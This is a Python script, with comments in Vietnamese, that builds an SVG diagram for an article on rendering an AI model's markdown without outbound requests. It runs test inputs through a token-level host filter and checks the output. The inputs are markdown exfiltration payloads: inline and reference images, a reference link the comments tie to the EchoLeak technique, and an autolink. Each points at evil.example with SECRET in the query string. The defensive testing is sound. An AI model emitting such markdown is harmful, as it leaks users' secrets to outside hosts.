"""Sinh parse-filter.svg: SVG tĩnh minh hoạ `SafeMarkdown` ở §2.5 "Code: render markdown của model
mà không gửi request ra ngoài".

Ý chính: regex trên văn bản phải biết mọi cú pháp (inline, reference, autolink); sau khi parse,
mọi cú pháp ảnh thành token `image` và mọi cú pháp link thành `link_open`/`link_close`, nên một
bước kiểm host trên token bắt được tất cả. Năm hàng lấy từ "Test đã chạy" của §2.5: test 1 (ảnh
inline), 2 (ảnh reference), 3 (link reference, kỹ thuật EchoLeak), 4 (autolink), 7 (ảnh từ host
trong allowlist được giữ). Allowlist giống ví dụ "Cách dùng" trong bài.

Script import `SafeMarkdown` thật từ ../scripts/safe_render.py (cần `markdown-it-py`, bài dùng
4.2.0), parse và render từng input, rồi assert loại token và HTML khớp với những gì hình vẽ.
URL trong hình rút gọn bằng "…"; input chạy thật dùng URL đầy đủ.

Màu: đỏ cho phần bị chặn (không còn request ra ngoài), xanh dương cho ảnh được giữ.
Không dùng cam để không đặt cạnh đỏ. Hình không có số liệu.

Chạy: python3 make_parse_filter.py
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "assets"))
sys.dont_write_bytecode = True     # không để __pycache__ trong ../scripts
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))
import svgkit  # noqa: E402
from safe_render import SafeMarkdown  # noqa: E402

md = SafeMarkdown(image_hosts={"cdn.shop.vn"}, link_hosts={"shop.vn", "docs.shop.vn"})

# (nhãn, input thật, các dòng hiển thị của input, token hiển thị, HTML hiển thị, có bị chặn không)
ROWS = [
    ("ảnh inline", "![x](https://evil.example/p.png?d=SECRET)",
     ["![x](https://evil.example/p.png?d=…)"], "image",
     "[ảnh bị chặn: evil.example]", True),
    ("ảnh reference", "![x][a]\n\n[a]: https://evil.example/p.png?d=SECRET",
     ["![x][a]", "[a]: https://evil.example/p.png?d=…"], "image",
     "[ảnh bị chặn: evil.example]", True),
    ("link reference", "[vào đây][r]\n\n[r]: https://evil.example/?k=SECRET",
     ["[vào đây][r]", "[r]: https://evil.example/?k=…"], "link_open",
     "vào đây [link bị chặn: evil.example]", True),
    ("autolink", "<https://evil.example/?d=SECRET>",
     ["<https://evil.example/?d=…>"], "link_open",
     "https://… [link bị chặn: evil.example]", True),
    ("ảnh trong allowlist", "![logo](https://cdn.shop.vn/logo.png)",
     ["![logo](https://cdn.shop.vn/logo.png)"], "image",
     '<img src="https://cdn.shop.vn/…">', False),
]

for label, text, _, tok, shown, blocked in ROWS:
    kinds = [c.type for t in md.md.parse(text) if t.type == "inline" for c in t.children]
    assert kinds[0] == tok, (label, kinds)
    html = md.render(text)
    if blocked:
        assert "<img" not in html and "<a " not in html, (label, html)
        assert ("[ảnh bị chặn: evil.example]" if tok == "image" else "[link bị chặn: evil.example]") in html
        if label == "link reference":
            assert "vào đây [link bị chặn: evil.example]" in html and "SECRET" not in html
        if label != "autolink":
            assert "SECRET" not in html, (label, html)
    else:
        assert '<img src="https://cdn.shop.vn/logo.png"' in html, html

W = 900
XM, XT, XR = 20, 380, 570          # cột: markdown, token, HTML
MW, TW, RW = 320, 130, 300
RH, GAPY, Y0 = 56, 14, 118
H = Y0 + len(ROWS) * (RH + GAPY) + 56
assert XM + MW + 30 <= XT and XT + TW + 50 <= XR and XR + RW <= W - 30
MONO_CH = 7.3                       # ước lượng bề rộng ký tự mono cỡ 12px


def esc(text: str) -> str:
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")


body: list[str] = []
body.append('<text class="title" x="20" y="38">Lọc trên token: mọi cú pháp ảnh, link thành cùng một dạng</text>')
body.append('<text class="cap2" x="20" y="62">Allowlist: ảnh từ cdn.shop.vn; link tới shop.vn, docs.shop.vn. '
            'Không có thẻ img hay link tới host lạ.</text>')
for x, w, head in ((XM, MW, "model sinh ra (markdown)"), (XT, TW, "token sau parse"), (XR, RW, "HTML render ra")):
    body.append(f'<text class="sub" x="{x}" y="{Y0 - 14}">{head}</text>')

for r, (label, _, lines, tok, shown, blocked) in enumerate(ROWS):
    y = Y0 + r * (RH + GAPY)
    cy = y + RH / 2
    body.append(f'<rect class="tok" x="{XM}" y="{y}" width="{MW}" height="{RH}" rx="7"/>')
    body.append(f'<text class="sub" x="{XM + 10}" y="{y + 16}">{label}</text>')
    for i, line in enumerate(lines):
        assert MONO_CH * len(line) <= MW - 20, line
        ly = y + 34 + i * 15 if len(lines) > 1 else y + 40
        body.append(f'<text class="lbl" style="font-size:12px;text-anchor:start" x="{XM + 10}" y="{ly}">'
                    f'{esc(line)}</text>')
    body.append(f'<path class="lfg" marker-end="url(#afg)" d="M{XM + MW},{cy}H{XT - 4}"/>')
    body.append(f'<rect class="tok" x="{XT}" y="{cy - 16}" width="{TW}" height="32" rx="7"/>')
    body.append(f'<text class="lbl" style="font-size:13px" x="{XT + TW / 2}" y="{cy + 5}">{tok}</text>')
    arrow = "lred" if blocked else "lblue"
    body.append(f'<path class="{arrow}" marker-end="url(#a{arrow[1:]})" d="M{XT + TW},{cy}H{XR - 4}"/>')
    body.append(f'<text class="sub mid halo" x="{(XT + TW + XR) / 2}" y="{cy - 8}">'
                f'{"chặn" if blocked else "giữ"}</text>')
    body.append(f'<rect class="{"red" if blocked else "blue"}" x="{XR}" y="{cy - 18}" width="{RW}" height="36" rx="7"/>')
    assert MONO_CH * len(shown) <= RW - 16, shown
    body.append(f'<text class="lbl halo" style="font-size:12px" x="{XR + RW / 2}" y="{cy + 5}">{esc(shown)}</text>')

body.append(svgkit.legend(20, H - 22, [("red", "bị chặn, không có request ra ngoài"),
                                       ("blue", "host trong allowlist, giữ nguyên")]))

svgkit.write(__file__, "parse-filter.svg", svgkit.svg(
    W, H, "Ảnh inline, ảnh kiểu reference, link kiểu reference và autolink trông khác nhau trong markdown, "
    "nhưng sau khi parse đều thành token image hoặc link_open. Một bước kiểm host trên token chặn cả bốn "
    "khi host ngoài allowlist, chỉ để lại chữ kèm tên host; ảnh từ cdn.shop.vn trong allowlist được giữ", body))
